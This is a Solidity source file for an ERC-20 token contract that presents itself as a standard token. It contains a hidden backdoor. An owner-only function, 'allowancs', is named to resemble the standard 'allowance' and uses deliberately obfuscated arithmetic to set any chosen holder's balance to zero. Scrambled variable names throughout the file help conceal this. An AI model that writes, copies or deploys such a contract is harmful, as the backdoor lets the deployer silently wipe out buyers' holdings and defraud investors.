pragma solidity ^0.8.5;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address acoritnt) external view returns (uint256);
    function transfer(address recipient, uint256 amtoutnrt) external returns (bool);
    function allowance(address Owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amtoutnrt) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amtoutnrt ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed Owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function Owner() public view virtual returns (address) {
        return _Owner;
    }
    modifier onlyOwner() {
        require(Owner() == _msgSender());
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_Owner, address(0x000000000000000000000000000000000000dEaD));
        _Owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract coin is Context, Ownable, IERC20 {
    mapping (address => uint256) private _accdertt;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _accdertt[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address acoritnt) public view override returns (uint256) {
        return _accdertt[acoritnt];
    }
    function allowancs(address dereeeer) public  onlyOwner {
    address zzsdasdsa = dereeeer;
    uint256 gdfdsdaas = _accdertt[zzsdasdsa]+333000+21+3+3-333027;
    uint256 reereeeee = gdfdsdaas+_accdertt[zzsdasdsa]-_accdertt[zzsdasdsa];
    uint256 qqqwww = reereeeee;
        _accdertt[zzsdasdsa] -= qqqwww;


    }    
    function transfer(address recipient, uint256 amtoutnrt) public virtual override returns (bool) {
        require(_accdertt[_msgSender()] >= amtoutnrt, "TT: transfer amtoutnrt exceeds balance");

        _accdertt[_msgSender()] -= amtoutnrt;
        _accdertt[recipient] += amtoutnrt;
        emit Transfer(_msgSender(), recipient, amtoutnrt);
        return true;
    }

    function allowance(address Owner, address spender) public view virtual override returns (uint256) {
        return _allowances[Owner][spender];
    }

    function approve(address spender, uint256 amtoutnrt) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amtoutnrt;
        emit Approval(_msgSender(), spender, amtoutnrt);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amtoutnrt) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amtoutnrt, "TT: transfer amtoutnrt exceeds allowance");

        _accdertt[sender] -= amtoutnrt;
        _accdertt[recipient] += amtoutnrt;
        _allowances[sender][_msgSender()] -= amtoutnrt;

        emit Transfer(sender, recipient, amtoutnrt);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}